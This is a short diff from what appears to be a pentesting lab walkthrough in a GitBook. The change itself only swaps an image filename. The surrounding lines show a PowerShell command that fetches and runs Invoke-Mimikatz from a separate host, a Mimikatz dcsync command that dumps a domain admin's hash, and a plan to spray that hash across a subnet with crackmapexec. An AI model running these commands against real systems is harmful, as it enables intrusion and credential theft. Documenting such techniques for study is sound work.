@@ -105,7 +105,7 @@ iex (iwr http://192.168.248.2:8090/Invoke-Mimikatz.ps1 -UseBasicParsing)
 Invoke-Mimikatz -Command '"lsadump::dcsync /user:bank\secure_admin /domain:bank.local"'
 ```
 
-![](<../../.gitbook/assets/image (16) (1) (3).png>)
+![](<../../.gitbook/assets/image (16) (1).png>)
 
 7\. The next step would be to spray this hash against all systems of the secure.local domain. But its just easier to spray it against the whole subnet with crackmapexec. To do this we use the following command:
 
